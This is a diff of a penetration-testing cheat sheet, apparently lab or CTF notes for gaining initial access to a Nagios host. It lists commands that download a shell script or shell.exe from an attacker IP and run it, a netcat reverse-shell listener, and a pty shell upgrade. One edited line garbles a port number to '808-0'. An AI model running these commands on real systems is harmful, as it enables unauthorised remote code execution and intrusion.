@@ -29,12 +29,12 @@
 ### Initial Access
 - Searchsploit nagios
   - searchsploit -m php/webapps/blah.txt  -> convert to py shell and read the comments/usage details in the the following code and input accordingly
- - python3 -m http.server 8080
+  - python3 -m http.server 808-0
   - Opens up a dedicated python server over the internet to serve files in that directory
   - http://10.9.2.90:8080/shell.sh | bash
  - nc -nlvp 1234
    - Opens up a netcat shell on attacker box for incoming connections 
- -  python -c 'import pty; pty.spawn("/bin/bash")'  
+ - python -c 'import pty; pty.spawn("/bin/bash")'  
    - Upgrade from a dump shell to  bash shell
  - powershell.exe Invoke-WebRequest -Uri https://10.10.10.10/shell.exe -OutFile ./shell.exe && .\shell.exe
    - powershell.exe — this is a shell in windows (other than cmd.exe) it is object oriented and it is the blue teams best friend and a hackers favorite mistress
